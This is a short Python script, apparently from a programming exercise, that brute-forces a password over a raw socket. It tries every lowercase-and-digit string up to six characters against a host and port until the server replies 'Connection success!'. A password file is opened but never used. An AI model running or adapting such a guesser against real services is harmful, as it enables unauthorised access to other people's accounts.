import sys
import socket
import itertools
import string

def next_password(file):

    chars = string.ascii_lowercase + string.digits

    for i in range(1, 7):
        iterator = itertools.product(chars, repeat=i)
        for combination in iterator:
            yield combination



def main():

    file = open("passwords.txt", "r")
    args = sys.argv
    if len(args) != 3:
        print("wrong number of arguments")
        sys.exit(1)

    new_socket = socket.socket()
    new_socket.connect((args[1], int(args[2])))


    iter = next_password(file)

    while True:
        password = "".join(next(iter))
        new_socket.send(password.encode())
        message = new_socket.recv(1024)
        if message.decode() == "Connection success!":
            print(password)
            break
        if message.decode() == "Too many attempts":
            print(message.decode())
            break

    file.close()
    new_socket.close()

if __name__ == "__main__":
    main()